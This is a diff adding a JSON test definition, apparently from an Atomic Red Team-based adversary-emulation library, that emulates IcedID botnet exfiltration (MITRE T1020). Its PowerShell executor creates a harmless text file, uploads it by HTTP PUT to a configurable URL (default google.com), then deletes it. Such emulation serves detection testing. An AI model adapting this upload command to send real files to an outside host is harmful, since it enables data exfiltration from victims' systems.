@@ -1,0 +1,35 @@
+{
+    "name": "IcedID Botnet HTTP PUT",
+    "description": "Creates a text file Tries to upload to a server via HTTP PUT method with ContentType Header Deletes a created file",
+    "supported_platforms": [
+        "windows"
+    ],
+    "executor": {
+        "command": "$fileName = \"#{file}\"\n$url = \"#{domain}\"\n$file = New-Item -Force $fileName -Value \"This is ART IcedID Botnet Exfil Test\"\n$contentType = \"application/octet-stream\"\ntry {Invoke-WebRequest -Uri $url -Method Put -ContentType $contentType -InFile $fileName} catch{}",
+        "cleanup_command": "$fileName = \"#{file}\"\nRemove-Item -Path $fileName -ErrorAction Ignore",
+        "name": "powershell",
+        "type": "Command Executor"
+    },
+    "id": "T1020",
+    "tactics": [
+        "Exfiltration"
+    ],
+    "technique": "Automated Exfiltration",
+    "source": "ART",
+    "uuid": "9c780d3d-3a14-4278-8ee5-faaeb2ccfbe0",
+    "arguments": {
+        "file": {
+            "description": "Exfiltration File",
+            "type": "string",
+            "default": "C:\\temp\\T1020_exfilFile.txt"
+        },
+        "domain": {
+            "description": "Destination Domain",
+            "type": "url",
+            "default": "https://google.com"
+        }
+    },
+    "preconditions": [],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
